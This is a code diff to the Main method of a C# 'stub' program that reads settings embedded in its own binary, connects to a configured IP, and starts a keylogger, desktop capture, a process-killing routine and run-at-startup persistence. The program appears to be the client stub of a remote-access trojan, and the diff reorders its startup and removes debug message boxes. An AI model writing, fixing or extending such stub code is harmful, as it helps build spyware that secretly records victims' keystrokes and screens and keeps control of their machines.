@@ -55,9 +55,6 @@ namespace stub
         static void Main(string[] args)
         {
             string[] settingsArray = new string[8];
-
-            string ID = settingsArray[5];
-            MutexHandler.createMutex(ID);
             
             AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);
 
@@ -68,17 +65,17 @@ namespace stub
                     byte[] stubBytes = br.ReadBytes(Convert.ToInt32(sr.BaseStream.Length));
                     string settings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("BUILD")).Replace("BUILD", "");
                     settingsArray = settings.Split('|');
-                    //MessageBox.Show(settings);
                 }
             }
-            /*
-            foreach (string setting in settingsArray)
-            {
-                MessageBox.Show(setting);
-            }
-            */
-            WebClientHandler.initwebClient();
+            string ID = settingsArray[5];
+            MutexHandler.createMutex(ID);
             
+            ConnectionIPHandler.IPSet(settingsArray[6]);
+            WebClientHandler.initwebClient();
+
+            ClientKeylogger.initClientKeylogger();
+            ClientDesktop.initClientDesktop();
+
             if (settingsArray[0] == "True")
             {
                 AntiProcess.StartAntiProcess();
@@ -89,22 +86,19 @@ namespace stub
             }
             if (settingsArray[2] == "True")
             {
-                ClientKeylogger.initClientKeylogger();
+                ClientKeylogger.StartKeylogger();
             }
             if (settingsArray[3] == "True")
             {
-                ClientDesktop.initClientDesktop();
+                ClientDesktop.StartDesktopCapture();
             }
             if (settingsArray[4] == "True")
             {
                 ClientAdder.runAtStartup();
             }
-            ConnectionIPHandler.IPSet(settingsArray[6]);
-            //MessageBox.Show(ID);
-            //MessageBox.Show(IP);
 
             WebClient webclient = WebClientHandler.wcReturn();
-            
+
             while (true)
             {
                 
